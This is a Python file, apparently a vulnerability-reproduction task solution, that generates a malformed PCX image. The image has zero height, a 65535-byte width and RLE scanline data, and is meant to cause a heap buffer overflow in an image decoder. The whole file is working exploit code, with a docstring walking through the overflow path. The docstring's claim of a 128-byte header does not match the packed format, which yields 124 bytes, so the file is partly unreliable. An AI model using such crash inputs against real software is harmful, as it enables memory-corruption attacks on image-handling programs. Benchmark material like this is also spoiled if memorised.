import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers a heap buffer overflow in a PCX image parser.

        The vulnerability is described as a failure to check for zero-width or
        zero-height images. This PoC exploits this by creating a PCX file with
        a height of 0. A common bug pattern in image decoders is to use a
        do-while loop for processing scanlines, which executes at least once
        even if the loop condition (height > 0) is initially false.

        The PoC is structured as follows:
        1.  A 128-byte PCX header is crafted with:
            - Height set to 0 (by making ymin > ymax).
            - Width set to a large value (65535).
            - BytesPerLine also set to 65535.
        2.  RLE-compressed image data is generated. This data, when decoded,
            produces a single scanline of 65535 bytes. Using RLE keeps the
            PoC file size small.
        3.  A standard PCX 256-color palette (preceded by a 0x0C marker) is
            appended to make the file more compliant with the PCX format,
            increasing the likelihood that it reaches the vulnerable code path.

        The intended vulnerable execution flow:
        1.  The parser reads the header and calculates an image buffer size of
            width * height = 65535 * 0 = 0 bytes. A tiny or zero-sized buffer
            is allocated on the heap.
        2.  The parser enters a do-while loop to read scanlines, which
            executes once.
        3.  It decodes the RLE data, filling a temporary buffer with a
            65535-byte scanline.
        4.  It then attempts to copy this 65535-byte scanline into the
            zero-sized main image buffer, causing a massive heap buffer overflow
            and triggering a crash.
        """

        header = struct.pack(
            '<BBBBHHHHHH48sBBHHHH54s',
            10,          # Manufacturer: ZSoft .pcx
            5,           # Version: 3.0 with 256-color palette
            1,           # Encoding: RLE
            8,           # BitsPerPlane
            0,           # xmin
            1,           # ymin
            65534,       # xmax (width = 65534 - 0 + 1 = 65535)
            0,           # ymax (height = 0 - 1 + 1 = 0)
            0,           # HDpi
            0,           # VDpi
            b'\x00' * 48, # Colormap
            0,           # Reserved
            1,           # NPlanes
            65535,       # BytesPerLine
            1,           # PaletteInfo: Color
            0,           # HScrSize
            0,           # VScrSize
            b'\x00' * 54  # Filler
        )

        scanline_size = 65535
        rle_data = bytearray()
        bytes_to_encode = scanline_size
        run_value = 0x00
        max_run_length = 63

        while bytes_to_encode > 0:
            run_length = min(bytes_to_encode, max_run_length)
            # RLE packet: (0b11xxxxxx count, 1 byte value)
            rle_data.append(0xC0 | run_length)
            rle_data.append(run_value)
            bytes_to_encode -= run_length

        palette_marker = b'\x0c'
        palette_data = b'\x00' * 768

        poc = header + rle_data + palette_marker + palette_data

        return poc